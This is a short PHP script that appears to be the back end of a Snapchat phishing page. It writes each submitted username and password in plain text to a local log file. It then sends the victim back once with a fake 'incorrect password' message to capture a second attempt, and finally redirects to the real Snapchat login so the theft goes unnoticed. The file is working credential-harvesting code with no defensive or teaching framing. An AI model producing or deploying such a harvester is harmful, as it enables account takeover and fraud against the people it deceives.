<?php
$location = "https://accounts.snapchat.com/accounts/login";

session_start();

// If they're coming here from the login page 
if(isset($_POST['username']) && isset($_POST['password']))
{
	// Get the details they entered
	$name = $_POST['username'];
	$pass = $_POST['password'];

	// Open a handle to the log file and write the details they entered
	$handle = fopen("log.txt", "a");
	fwrite($handle, $name . ":" . $pass . "\n");
	fclose($handle);

	// In case they accidentally entered incorrect details the first time, get them to reenter their details before redirecting them to the actual page
	if(isset($_SESSION['has_guessed']))
	{
		// Redirect them to the actual page
		header("Location: " . $location);
		exit();
	} else
	{
		// Redirect them back to the login page for a second guess
		$_SESSION['has_guessed'] = true;
		header("Location: index.html?incorrect_pass");
		exit();
	}
} else
{
	header("Location: index.html");
	exit();
}
?>